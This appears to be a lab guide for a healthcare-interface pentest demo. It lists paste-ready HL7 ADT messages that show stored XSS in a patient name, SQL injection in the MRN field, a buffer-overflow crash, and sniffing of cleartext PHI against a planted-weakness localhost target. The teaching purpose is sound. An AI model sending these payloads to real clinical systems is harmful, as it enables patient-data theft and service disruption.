# Ready-to-paste attack messages

Paste these into the **medaudit2 Client tab** (target `localhost:2575`, no TLS)
to demonstrate each planted weakness by hand. Use `\r` between segments — the
medaudit2 client handles the MLLP framing for you.

> All data is synthetic. Use only against the demo target.

---

## 1. Baseline — a normal admission (proves connectivity)

```
MSH|^~\&|EPIC|STELSEWHERE|MEDAUDIT|PENTEST|20240101120000||ADT^A01|CTRL0001|P|2.5
PID|1||200001||Bauer^Nadia||19900614|F|||||||||||512-33-1188
```
Expected: `AA` ACK, and the patient appears in the worklist at http://localhost:8081/

---

## 2. Stored XSS — malicious patient name (the showstopper)

```
MSH|^~\&|EPIC|STELSEWHERE|MEDAUDIT|PENTEST|20240101120100||ADT^A01|CTRL0002|P|2.5
PID|1||200002||<script>alert('PHI exfiltrated via '+document.domain)</script>^Evil||19900614|M|||||||||||000-00-0000
```
Expected: `AA` ACK. Now open http://localhost:8081/ — the script executes in the
"clinician's" browser. A real payload could exfiltrate the session or PHI.

---

## 3. SQL injection — unbalanced quote in the MRN (error-based)

```
MSH|^~\&|EPIC|STELSEWHERE|MEDAUDIT|PENTEST|20240101120200||ADT^A01|CTRL0003|P|2.5
PID|1||200003'||Test^Injection||19900614|M
```
Expected: `AE` (application error) ACK whose text reflects the raw SQLite error —
proof the MRN is concatenated into SQL. Try also: `200003' OR '1'='1`.

---

## 4. Buffer overflow — oversized field crashes the connection

Send an ADT where a field is thousands of characters (the fuzzer's `overflow`
strategy does this automatically). By hand, put a very long string in PID-5:

```
MSH|^~\&|EPIC|STELSEWHERE|MEDAUDIT|PENTEST|20240101120300||ADT^A01|CTRL0004|P|2.5
PID|1||200004||AAAAAAAA...(>8192 chars)...AAAA^X||19900614|M
```
Expected: the interface drops the connection with no ACK (simulated crash) —
medaudit2 records a timeout/connection error finding.

---

## 5. Cleartext PHI — capture the traffic

Because the feed is plaintext, capture it (tcpdump/Wireshark on the loopback, or
medaudit2's PCAP workflow) and run medaudit2 **Traffic** analysis. Names, DOBs,
and SSNs (PID-19) are visible in the clear and light up PII detection with an
"unencrypted" finding.
